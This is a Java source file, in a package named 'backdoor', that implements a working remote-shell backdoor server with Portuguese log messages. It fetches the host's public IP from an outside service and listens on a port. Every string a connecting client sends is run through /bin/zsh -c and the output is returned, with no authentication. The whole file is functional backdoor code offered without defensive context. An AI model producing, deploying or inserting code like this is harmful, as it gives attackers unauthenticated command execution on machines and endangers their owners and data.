package backdoor.java;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.BufferedReader;
import java.io.Closeable;
import java.io.InputStream;
import java.io.InputStreamReader;

import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.HttpURLConnection;

import java.util.ArrayList;
import java.util.logging.Logger;

public class Server {
    
    public static void main(String[] args) throws IOException {

        final int PORT = Integer.parseInt(args[0]);

        URL url_name = new URL("http://checkip.amazonaws.com");
        HttpURLConnection conection = (HttpURLConnection) url_name.openConnection();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(conection.getInputStream()));
        
        ServerSocket server = new ServerSocket(PORT);
        System.out.println("\nServidor iniciado: " + bufferedReader.readLine() + ": " + PORT);
        bufferedReader.close();

        while(true){
            
            try{
        
                Socket client = server.accept();
                System.out.println("Client conectado: " + client.getInetAddress().getHostAddress() + "\n");
            
                ObjectOutputStream exit = new ObjectOutputStream(client.getOutputStream());
                new ClientThread(client, exit).start();

                exit.writeObject("\nHello from Server!\n");
                
            } catch (Exception exception){ exception.printStackTrace(); break; }
        }

        server.close();

    }

}

class ClientThread extends Thread {

    private Socket client;
    private ObjectOutputStream exit;

    public ClientThread(Socket client, ObjectOutputStream exit){
        this.client = client;
        this.exit = exit;
    }
    
    public void run() {

        try {
            
            ObjectInputStream entrada = new ObjectInputStream(client.getInputStream());

            while(client.isConnected()){
                
                String msg = (String)entrada.readObject();
                System.out.println("Client: " + msg + "\n");
                
                String log = new Eval().executeCommand(msg);
                
                try {
                    this.exit.writeObject("\n" + log);    
                } catch (Exception e) {
                    e.printStackTrace();
                }

                if("exit".equals(msg)) {

                    System.out.println("Cliente desconectado!\n");
                    
                    entrada.close();
                    exit.flush();
                    client.close();
                    
                    break;
                }

            }
        }
        catch(Exception exception) { exception.printStackTrace(); }
    
    }
    
}

class Eval {

    private static final Logger log = Logger.getLogger(Eval.class.getName());

    public String executeCommand(final String command) throws IOException {

        final ArrayList<String> commands = new ArrayList<String>();
        commands.add("/bin/zsh");
        commands.add("-c");
        commands.add(command);

        BufferedReader bufferedReader = null;
        String logBuffer = "";

        try {
        
            final ProcessBuilder processBuilder = new ProcessBuilder(commands);
            final Process process = processBuilder.start();
            final InputStream inputStream = process.getInputStream();
            final InputStreamReader inputStreamReader = new InputStreamReader(inputStream);

            bufferedReader = new BufferedReader(inputStreamReader);

            String line;
            while((line = bufferedReader.readLine()) != null) { logBuffer += line + "\n"; }
            System.out.println(logBuffer);
            return logBuffer;
        
        } catch (IOException ioException){
        
            log.severe("Erro ao executar o comando shell: " + ioException.getMessage());
            throw ioException;
        
        } finally { secureClose(bufferedReader); }
    }

    private void secureClose(final Closeable resource){
        try{
            if(resource != null){
                resource.close();
            }
        } catch (IOException ioException){
            log.severe("Erro: " + ioException.getMessage());
        }
    }

}
